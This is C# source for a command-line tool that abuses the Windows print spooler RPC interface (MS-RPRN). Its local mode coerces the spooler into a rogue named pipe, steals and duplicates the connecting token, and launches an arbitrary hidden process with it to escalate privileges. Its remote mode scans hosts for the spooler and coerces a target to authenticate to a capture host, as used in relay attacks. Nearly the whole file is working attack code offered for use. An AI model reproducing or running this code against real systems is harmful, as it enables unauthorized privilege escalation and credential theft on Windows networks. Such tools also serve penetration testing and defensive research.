using CommandLine.Text;
using CommandLine;
using System;
using System.Linq;
using System.Text;
using System.IO;
using System.Net;
using System.Threading;
using System.Runtime.InteropServices;
using static Spooler.NativeMethods;
using System.IO.Pipes;


namespace Spooler
{
    internal class Program
    {
        [Verb("local", HelpText = "Local MS-RPRN abuse using SeImpersonatePrivilege.")]
        class LocalOptions
        {
            [Option('c', "check", Default = false, HelpText = "Check abuse possibility.")]
            public bool Check { get; set; }

            [Option('x', "command", HelpText = "Command to execute.")]
            public string Command { get; set; }

            [Option('a', "args", HelpText = "Command arguments.")]
            public string Args { get; set; }

            [Option('s', "show", Default = false, HelpText = "Show window.")]
            public bool Show { get; set; }
        }

        [Verb("remote", HelpText = "Remote MS-RPRN abuse.")]
        class RemoteOptions
        {
            [Option('f', "find", HelpText = " Find if a remote server has Print Spooler enabled. " +
                "Accepts comma-separated list of addresses.")]
            public string Check { get; set; }

            [Option('t', "target", HelpText = "Target host with enabled Print Spooler service.")]
            public string Target { get; set; }

            [Option('c', "capture", HelpText = "Capture host.")]
            public string Capture { get; set; }
        }

        static IntPtr hDupToken = IntPtr.Zero;
        static int Main(string[] args)
        {
            try
            {
                var parser = new Parser(with =>
                {
                    with.EnableDashDash = true;
                    with.HelpWriter = null;
                    with.AutoVersion = false;
                });
                var result = parser.ParseArguments<LocalOptions, RemoteOptions>(args);
                return result.MapResult(
                    (LocalOptions opts) => RunLocal(opts),
                    (RemoteOptions opts) => RunRemote(opts),
                    errs =>
                    {
                        var helpText = HelpText.AutoBuild(result, h =>
                        {
                            h.AdditionalNewLineAfterOption = false;
                            h.AddDashesToOption = true;
                            h.AutoVersion = false;
                            h.Heading = "Local and remote MS-RPRN abuse";
                            h.Copyright = "";
                            return HelpText.DefaultParsingErrorsHandler(result, h);
                        }, e => e, true);
                        Console.WriteLine(helpText);
                        return 1;
                    }
                 );
            } 
            catch (Exception e)
            {
                Console.WriteLine(e.ToString()); 
                return 1;
            }
        }

        static int RunLocal(LocalOptions opts)
        {
            try
            {
                var localPipePath = @"\\.\pipe\";
                var pipes = Directory.GetFiles(localPipePath, "spoolss");
                if (pipes.Length == 0)
                {
                    Console.WriteLine("[!] Spoolss named pipe is not found.");
                    return 1;
                }

                LUID luid = new LUID();
                if (!LookupPrivilegeValue(null, "SeImpersonatePrivilege", ref luid))
                {
                    Console.WriteLine("[!] User doesn't have SeImpersonatePrivilege set.");
                    return 1;
                }

                Console.WriteLine("[+] Print spooler service is running and user has SeImpersonatePrivilege privilege set!");

                if (opts.Check) return 0;

                if (string.IsNullOrEmpty(opts.Command))
                {
                    Console.WriteLine("[!] Specify --command (-x).");
                    return 1;
                }

                string pipeName = Guid.NewGuid().ToString().ToLower();
                string pipeServerPath = $"{pipeName}\\pipe\\spoolss";
                string target = @"\\" + Dns.GetHostName();
                string captureServer = $"{target}/pipe/{pipeName}";

                CancellationTokenSource cts = new CancellationTokenSource();
                var obj = new Tuple<CancellationToken, string>(cts.Token, pipeServerPath);
                ThreadPool.QueueUserWorkItem(new WaitCallback(NamedPipeServerWorker), obj);

                rprn printer = new rprn();
                rprn.DEVMODE_CONTAINER devContainer = new rprn.DEVMODE_CONTAINER();
                if (Coerce(printer, devContainer, target, captureServer) == 0)
                {
                    Thread actionThread = new Thread(() =>
                    {
                        var sbSystemDir = new StringBuilder(256);
                        if (GetSystemDirectory(sbSystemDir, 256) > 0)
                        {
                            if (CreateEnvironmentBlock(out IntPtr lpEnv, hDupToken, false))
                            {
                                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                                STARTUPINFO si = new STARTUPINFO();
                                si.cb = Marshal.SizeOf(si);
                                si.lpDesktop = "WinSta0\\Default";
                                uint dwCreationFlags = 0x00000400;
                                si.wShowWindow = 1;
                                if (!opts.Show)
                                {
                                    dwCreationFlags |= 0x08000000;
                                    si.wShowWindow = 0;
                                }
                                string args = null;
                                if (!string.IsNullOrEmpty(opts.Args))
                                {
                                    args = $"\"{opts.Command}\" {opts.Args}";
                                }

                                if (CreateProcessWithTokenW(hDupToken, 1, opts.Command, args, dwCreationFlags,
                                    IntPtr.Zero, sbSystemDir.ToString(), ref si, out pi))
                                {
                                    Console.WriteLine("[+] Started process with PID {0}.", pi.dwProcessId);
                                }
                                else
                                {
                                    Console.WriteLine("[!] CreateProcessWithTokenW failed: {0}.", Marshal.GetLastWin32Error());
                                }
                            }
                            else
                            {
                                Console.WriteLine("[!] CreateEnvironmentBlock failed: {0}.", Marshal.GetLastWin32Error());
                            }
                        }
                        else
                        {
                            Console.WriteLine("[!] GetSystemDirectory failed: {0}.", Marshal.GetLastWin32Error());
                        }

                        CloseHandle(hDupToken);
                    });

                    actionThread.Start();
                    actionThread.Join();
                    return 0;
                }
                else
                {
                    cts.Cancel();
                    Thread.Sleep(1000);

                    // Dummy client, don't want to write async code.
                    using (NamedPipeClientStream npcs = new NamedPipeClientStream(pipeServerPath))
                    {
                        npcs.Connect(100);
                    }
                }

                cts.Dispose();
                return 0;
            } 
            catch (Exception ex)
            {
                Console.WriteLine("[!] Error: {0}", ex);
                return -1;
            }
        }

        static void NamedPipeServerWorker(object obj)
        {
            var args = (Tuple<CancellationToken, string>)obj;
            var pipeServerPath = args.Item2;
            using (var serverStream = new NamedPipeServerStream(pipeServerPath, PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.None))
            {
                serverStream.WaitForConnection();
                if (serverStream.IsConnected && !args.Item1.IsCancellationRequested)
                {
                    Console.WriteLine("[+] Connected to the named pipe \\\\.\\pipe\\{0}.", pipeServerPath);
                    serverStream.RunAsClient(() =>
                    {
                        if (OpenThreadToken((IntPtr)(-2), 0xF01FF, false, out IntPtr hToken))
                        {
                            if (!DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hDupToken))
                            {
                                Console.WriteLine("[!] DuplicateTokenEx failed: {0}", Marshal.GetLastWin32Error());
                            }
                        }
                        else
                        {
                            Console.WriteLine("[!] OpenThreadToken failed: {0}", Marshal.GetLastWin32Error());
                        }
                    });
                }
            }
        }

        static int RunRemote(RemoteOptions opts)
        {
            rprn printer = new rprn();
            rprn.DEVMODE_CONTAINER devContainer = new rprn.DEVMODE_CONTAINER();

            if (!string.IsNullOrEmpty(opts.Check))
            {
                var servers = opts.Check.Split(',');
                foreach (var s in servers)
                {
                    var server = @"\\" + s;
                    if (printer.RpcOpenPrinter(server, out var handle, null, ref devContainer, 0) == 0)
                    {
                        Console.WriteLine("[+] {0}", s);
                    }
                    else
                    {
                        Console.WriteLine("[-] {0}", s);
                    }
                    printer.RpcClosePrinter(ref handle);
                }
            } 
            else if (!string.IsNullOrEmpty(opts.Target) && !string.IsNullOrEmpty(opts.Capture))
            { 
                var target = @"\\" + opts.Target;
                var capture = @"\\" + opts.Capture;
                return Coerce(printer, devContainer, capture, target);
            }
            else
            {
                Console.WriteLine("[!] Provide either --find (-f) or --target (-t) and --capture (-c)");
                return 1;
            }


            return 0;
        }

        static int Coerce(rprn printer, rprn.DEVMODE_CONTAINER devContainer, string target, string capture)
        {
            if (printer.RpcOpenPrinter(target, out var handle, null, ref devContainer, 0) == 0)
            {
                var result = printer.RpcRemoteFindFirstPrinterChangeNotificationEx(handle, 0x00000100, 0, capture, 0);
                printer.RpcClosePrinter(ref handle);
                
                if (result == 5)
                {
                    Console.WriteLine("[*] Access denied. The coerced authentication probably worked.");
                } 
                else if (result == 6)
                {
                    Console.WriteLine("[*] Invalid handle. The coerced authentication probably worked.");
                }
                else
                {
                    Console.WriteLine("[!] RpcRemoteFindFirstPrinterChangeNotificationEx error: {0}.", result);
                }

                return 0;
            }
            else
            {
                Console.WriteLine("[!] Failed to open the printer.");
                return 1;
            }
        }

    }
}
